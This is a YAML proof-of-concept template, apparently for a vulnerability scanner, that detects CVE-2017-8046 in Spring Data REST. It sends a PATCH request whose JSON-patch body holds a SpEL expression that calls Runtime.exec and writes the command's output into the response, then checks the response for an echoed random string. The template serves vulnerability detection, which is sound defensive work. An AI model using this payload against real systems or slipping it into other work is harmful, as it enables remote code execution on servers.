name: poc-yaml-spring-data-rest-cve-2017-8046-rce
set:
  r1: randomLowercase(10)
rules:
  - method: PATCH
    path: /customers/1
    headers:
      Content-Type: application/json-patch+json
    body: >-
      [{"op":"add","path":"T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec("echo r1").getInputStream(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())/xxlegend"}]
    expression: >
      response.status == 200 && response.body.bcontains(bytes("r1"))
detail:
  author: x1n9Qi8
  links:
    - http://xxlegend.com/2017/09/29/Spring%20Data%20Rest%E6%9C%8D%E5%8A%A1%E5%99%A8PATCH%E8%AF%B7%E6%B1%82%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9ECVE-2017-8046%E8%A1%A5%E5%85%85%E5%88%86%E6%9E%90/